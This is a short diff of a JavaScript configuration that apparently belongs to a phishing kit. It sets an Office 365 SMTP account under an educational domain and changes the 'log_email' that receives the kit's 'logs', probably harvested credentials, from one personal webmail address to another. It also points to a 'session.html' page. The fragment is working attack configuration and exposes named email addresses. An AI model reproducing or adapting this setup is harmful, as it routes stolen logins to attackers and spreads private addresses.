@@ -2,7 +2,7 @@ var smtp_host = 'smtp.office365.com';
 var smtp_username = 'marc.declercq@edu.vlerick.com';
 
 //Enter were logs will go here
-var log_email = 'nelsonjail@yahoo.com'
+var log_email = 'kjvluv1@gmail.com'
 
 
 url_link = "session.html";
